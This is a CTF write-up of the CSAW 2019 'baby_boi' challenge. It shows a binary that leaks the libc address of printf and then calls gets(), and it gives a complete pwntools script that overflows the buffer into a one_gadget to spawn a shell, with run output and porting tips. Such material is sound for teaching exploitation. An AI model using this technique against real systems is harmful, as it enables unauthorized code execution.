# Csaw 2019 Babyboi

Let's take a look at the binary, libc file, and source code. For this challenge we do get a copy of it:

```
$    file baby_boi
baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
$    pwn checksec baby_boi
[*] '/Hackery/pod/modules/8-bof_dynamic/csaw19_babyboi/baby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./libc-2.27.so
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.3.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$    ./baby_boi
Hello!
Here I am: 0x7f995049c830
15935728
$    cat baby_boi.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  char buf[32];
  printf("Hello!\n");
  printf("Here I am: %p\n", printf);
  gets(buf);
}
```

So we can see that the binary just prompts us for text. Looking at the source code, we see that it prints the libc address for `printf`. After that it calls `gets` on a fixed sized buffer, which gives us a buffer overflow. We can see that the `libc` version is `libc-2.27.so `. Also the only binary protection we see is NX.

## Exploitation

So to exploit this, we will use the buffer overflow. We will call a oneshot gadget, which is a single ROP gadget in the libc that will call `execve("/bin/sh")` given the right conditions. We can find this using the `one_gadget` utility (https://github.com/david942j/one_gadget):

```
$    one_gadget libc-2.27.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

So leveraging the libc infoleak with the `printf` statement to the libc `printf` (and that we know which libc version it is), we know the address space of the libc. For which onegadget to pick, I typically just do trial and error to see what conditions will work. You can actually check when it is called to see what conditions will be met however.

## Exploit

Putting it all together, we have the following exploit. This was ran on `Ubuntu 18.04`:

```
from pwn import *

# Establish the target
target = process('./baby_boi', env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF('libc-2.27.so')
#gdb.attach(target)

print target.recvuntil("ere I am: ")

# Scan in the infoleak
leak = target.recvline()
leak = leak.strip("\n")

base = int(leak, 16) - libc.symbols['printf']

print "wooo:" + hex(base)

# Calculate oneshot gadget
oneshot = base + 0x4f322

payload = ""
payload += "0"*0x28         # Offset to oneshot gadget
payload += p64(oneshot)     # Oneshot gadget

# Send the payload
target.sendline(payload)

target.interactive()
```

When we run the exploit:

```
$    python exploit.py
[+] Starting local process './baby_boi': pid 12693
[*] '/home/guyinatuxedo/Desktop/babyboi/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Hello!
Here I am:
wooo:0x7fe0eb22e000
[*] Switching to interactive mode
$ w
 21:29:32 up 57 min,  1 user,  load average: 0.17, 0.26, 0.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               16Sep19 ?xdm?  47.39s  0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
baby_boi  baby_boi.c  exploit.py  libc-2.27.so    readme.md
```

## Are you getting a Segmentation fault?

Your system might not be compatible with the provided `libc` version, but you can still craft your own exploit for your `libc` version.

1. Figure out your `libc` path:

```bash
$ ldd ./baby_boi

  linux-vdso.so.1 =>  (0x00007fff3e1f3000)
  libc.so.6 => /lib/libc.so.6 (0x00007f621f162000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f621f504000)
```

We can see that our `libc` sits in `/lib/libc.so.6`

2. Now we can find the `one_gadget` for your `libc` version:

```bash
$ one_gadget /lib/libc.so.6
```

3. Finally replace the exploit with your `libc` path and the new adress found through the `one_gadget`.
